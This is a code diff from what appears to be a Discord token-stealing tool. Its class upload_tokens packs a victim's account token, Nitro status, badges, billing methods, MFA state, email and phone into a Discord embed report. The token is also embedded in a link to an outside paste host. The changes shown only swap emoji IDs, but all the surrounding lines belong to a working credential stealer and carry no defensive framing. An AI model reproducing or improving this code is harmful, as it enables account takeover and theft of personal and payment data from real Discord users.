@@ -250,7 +250,7 @@ class upload_tokens:
                         payment_methods.append('💳')
                     
                     elif method['type'] == 2:
-                        payment_methods.append("<:Paypal:1073744442965631118>")
+                        payment_methods.append("<:Paypal:1073744418512846848>")
 
                     else:
                         payment_methods.append('❓')
@@ -342,15 +342,15 @@ class upload_tokens:
             embed = Embed(title=f"{username} ({user_id})", color=0x000000)
             embed.set_thumbnail(url=avatar)
 
-            embed.add_field(name="<a:Among_Us_Black:1073744941790007306> Token:", value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
-            embed.add_field(name="<a:Evolving_badge_Nitro_a_scaling:1073744626650988554> Nitro:", value=f"{nitro}", inline=True)
+            embed.add_field(name="<:Among_Us_Black:1073744915932119151> Token:", value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
+            embed.add_field(name="<a:Evolving_badge_Nitro_a_scaling:1073743165821034577> Nitro:", value=f"{nitro}", inline=True)
             embed.add_field(name="<a:BadgesRoll:1073745166977998959> Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
-            embed.add_field(name="<a:Discord_CreditCard:1073745438454329344> Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
-            embed.add_field(name="<:SecuritySheild:1073745746039406702> MFA:", value=f"{mfa}", inline=True)
+            embed.add_field(name="<:Discord_CreditCard:1073745405285765160> Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
+            embed.add_field(name="<:SecuritySheild:1073745717073563678> MFA:", value=f"{mfa}", inline=True)
 
             embed.add_field(name="\u200b", value="\u200b", inline=False)
             
-            embed.add_field(name="<a:Gmail:1073746191424172112> Email:", value=f"{email if email != None else 'None'}", inline=True)
+            embed.add_field(name="<:Gmail:1073746145467183164> Email:", value=f"{email if email != None else 'None'}", inline=True)
             embed.add_field(name="<:IphoneX:1073746271686373428> Phone:", value=f"{phone if phone != None else 'None'}", inline=True)    
 
             embed.add_field(name="\u200b", value="\u200b", inline=False)
